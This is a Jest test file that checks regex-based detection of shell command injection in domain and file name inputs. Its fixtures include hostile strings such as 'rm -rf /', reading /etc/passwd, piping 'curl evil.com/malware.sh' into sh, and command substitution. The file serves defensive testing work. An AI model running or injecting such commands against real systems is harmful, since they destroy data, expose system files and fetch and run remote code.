import { describe, it, expect } from '@jest/globals';

export function runCommandInjectionTests() {
  describe('Command Injection Attempts', () => {
    it('should detect shell command injection patterns', () => {
      const maliciousCommands = [
        'example.com; rm -rf /',
        'example.com | cat /etc/passwd',
        'example.com && curl evil.com/malware.sh | sh',
        'example.com`whoami`',
        '$(curl evil.com)',
      ];

      maliciousCommands.forEach((input) => {
        const hasShellChars = /[;&|`$(){}]/.test(input);
        expect(hasShellChars).toBe(true);
      });
    });

    it('should detect command chaining attempts', () => {
      const chainedCommands = [
        'file.txt; cat /etc/passwd',
        'file.txt && echo hacked',
        'file.txt || echo fallback',
      ];

      chainedCommands.forEach((input) => {
        const hasChaining = /;\s*\w+|&&|\|\|/.test(input);
        expect(hasChaining).toBe(true);
      });
    });

    it('should validate safe domain names', () => {
      const safeDomains = ['example.com', 'sub.example.com', 'example-shop.com'];

      safeDomains.forEach((domain) => {
        const isSafe = /^[a-zA-Z0-9.-]+$/.test(domain);
        expect(isSafe).toBe(true);

        const hasShellChars = /[;&|`$(){}]/.test(domain);
        expect(hasShellChars).toBe(false);
      });
    });
  });
}
